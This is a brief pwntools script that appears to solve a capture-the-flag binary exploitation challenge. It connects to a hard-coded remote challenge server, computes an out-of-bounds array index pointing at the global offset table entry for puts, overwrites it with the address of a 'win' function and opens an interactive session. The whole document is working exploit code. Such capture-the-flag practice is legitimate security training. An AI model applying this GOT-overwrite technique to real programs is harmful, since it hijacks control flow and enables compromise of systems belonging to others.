from pwn import *
REMOTE = True

if REMOTE:
    HOST, PORT = '54.180.153.92', 50000
else:
    HOST, PORT = 'localhost', 50000

io = remote(HOST, PORT)
#io = process('../challenge/main')
elf = ELF('../challenge/main')
win = elf.symbols['win']

offset = (elf.got['puts'] - 0x4040a0) // 4

io.sendlineafter('idx > ', str(offset))
io.sendlineafter('value > ', str(win))
io.interactive()
